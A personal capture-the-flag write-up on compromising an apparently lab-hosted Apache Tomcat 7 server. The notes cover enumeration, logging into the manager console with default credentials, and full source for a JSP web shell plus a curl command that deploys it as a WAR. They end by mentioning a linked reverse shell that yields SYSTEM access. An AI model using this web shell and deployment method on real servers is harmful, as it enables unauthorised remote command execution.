Main steps
1. Enumerate machine for `Tomcat` application
2. Default credentials for access to manager console
3. Upload WAR file for reverse shell

Learning points
1. 

`nmap`
![[Pasted image 20260324173526.png]]

Port 8080 open, running `Apache Tomcat/7.0.88` and `Apache-Coyote/1.1`.
![[Pasted image 20260324174731.png]]

Tried accessing the Manager web interface with `admin`:`admin` and was able to login, but got an error stating that the user does not have GUI privileges.

The `admin` user is able to view the server status.
![[Pasted image 20260324174942.png]]

Tried a few other combinations, and `tomcat`:`s3cret` gave me access to the manager console.
![[Pasted image 20260324175849.png]]

With access to the manager application, I can now upload whatever WAR files I want to, including shell scripts. Created a simple web shell with:
```
cat > shell.jsp << 'EOF'
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>
EOF
```

and converted it to a WAR file with `jar -cvf`, then uploaded it to the manager with
```
curl -u 'tomcat:s3cret' \
  --upload-file shell.war \
  "http://10.129.224.75:8080/manager/text/deploy?path=/shell&update=true"
```

I can now run arbitrary commands with `curl` like this:
![[Pasted image 20260324180301.png]]

Found a JSP reverse shell payload here https://github.com/LaiKash/JSP-Reverse-and-Web-Shell and uploaded it to the server, then `curl`ed the path to open a reverse shell as `ntauthority\system`.
![[Pasted image 20260324182859.png]]

Both the user and administrator flags were here.
![[Pasted image 20260324183606.png]]

